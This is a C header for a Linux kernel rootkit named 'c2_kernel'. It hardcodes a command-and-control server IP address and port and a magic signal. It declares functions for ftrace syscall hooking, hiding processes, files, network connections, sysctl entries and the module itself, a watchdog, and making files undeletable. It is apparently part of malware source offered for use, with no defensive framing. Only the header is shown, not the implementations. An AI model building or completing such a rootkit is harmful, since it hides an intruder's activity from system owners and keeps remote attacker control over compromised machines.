#ifndef C2_CORE_H
#define C2_CORE_H

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/version.h>
#include <linux/kallsyms.h>
#include <linux/ftrace.h>
#include <linux/sched.h>
#include <linux/proc_fs.h>
#include <linux/fs.h>
#include <linux/dirent.h>
#include <linux/namei.h>
#include <linux/cred.h>
#include <linux/uidgid.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/skbuff.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/ipv6.h>
#include <net/sock.h>
#include <net/tcp.h>
#include <linux/spinlock.h>
#include <linux/rwlock.h>
#include <linux/jhash.h>
#include <linux/sysinfo.h>
#include <linux/utsname.h>
#include <linux/workqueue.h>
#include <linux/delay.h>

/* ============================================
   CONFIGURATION
   ============================================ */

#define MODULE_NAME "c2_kernel"
#define MAGIC_SIGNAL 59
#define C2_SERVER_IP "107.152.44.183"
#define C2_SERVER_PORT 5000
#define WATCHDOG_INTERVAL 60
#define MAX_HIDDEN_PIDS 1024

/* ============================================
   STRUCTURES
   ============================================ */

struct hidden_pid {
    pid_t pid;
    struct list_head list;
};

struct ftrace_hook {
    const char *name;
    void *function;
    void *original;
    struct ftrace_ops ops;
    unsigned long address;
};

/* ============================================
   GLOBAL VARIABLES
   ============================================ */

extern struct list_head hidden_pids;
extern spinlock_t hidden_lock;
extern int watchdog_enabled;

/* ============================================
   FUNCTION PROTOTYPES
   ============================================ */

/* process.c */
bool is_pid_hidden(pid_t pid);
void hide_pid(pid_t pid);
int hide_processes(void);

/* file.c */
int init_file_hiding(void);
void cleanup_file_hiding(void);

/* network.c */
int init_network_hiding(void);
void cleanup_network_hiding(void);

/* module.c */
void hide_self_module(void);
int init_module_hiding(void);
void cleanup_module_hiding(void);

/* watchdog.c */
int init_watchdog(void);
void cleanup_watchdog(void);

/* ftrace_helper.c */
int fh_install_hook(struct ftrace_hook *hook);
void fh_remove_hook(struct ftrace_hook *hook);
int install_hooks(struct ftrace_hook *hooks, size_t count);
void remove_hooks(struct ftrace_hook *hooks, size_t count);

/* sysctl.c */
int hide_sysctl(void);

/* immortal.c */
int make_file_immortal(const char *path);

#endif /* C2_CORE_H */
